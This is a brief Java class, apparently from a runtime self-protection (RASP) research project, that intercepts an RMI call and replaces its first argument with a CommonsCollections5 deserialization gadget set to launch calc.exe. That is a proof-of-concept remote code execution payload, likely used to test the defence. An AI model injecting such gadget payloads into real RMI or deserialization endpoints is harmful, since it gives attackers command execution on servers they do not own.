package teu.rasp.visitorAdapter_Source;

import teu.rasp.util.commonscollections5;

import java.lang.reflect.Method;

public class RMIInterceptorVisitorAdapterSource {
    public void whatever(Object proxy, Method method, Object[] args) throws Exception {
        args[0]= commonscollections5.getObject("calc.exe");;
    }
}
